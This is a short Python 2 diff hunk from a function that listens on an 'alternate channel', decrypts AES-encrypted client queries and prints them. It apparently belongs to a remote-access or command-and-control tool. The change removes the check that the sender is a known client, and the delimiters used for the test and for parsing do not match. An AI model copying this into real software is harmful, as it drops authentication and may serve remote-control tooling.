@@ -76,7 +76,7 @@ def listen_alt_channel(timeout):
                             client.send(utils.EncodeAES(cipher, 'NO'))
                 except IndexError:
                     pass
-            elif len(raw_data.split(' ?!?! ')) > 1 and raw_data.split(' ???? ')[0] in clients.keys():
+            elif len(raw_data.split(' ?!?! ')) > 1:
                 cipher = AES.new(base64.b64decode(raw_data.split(' ???? ')[0]))
                 decrypted_query = utils.DecodeAES(cipher, raw_data.split(' ???? ')[1])
                 print '[*] Decrypted Query: %s' % decrypted_query
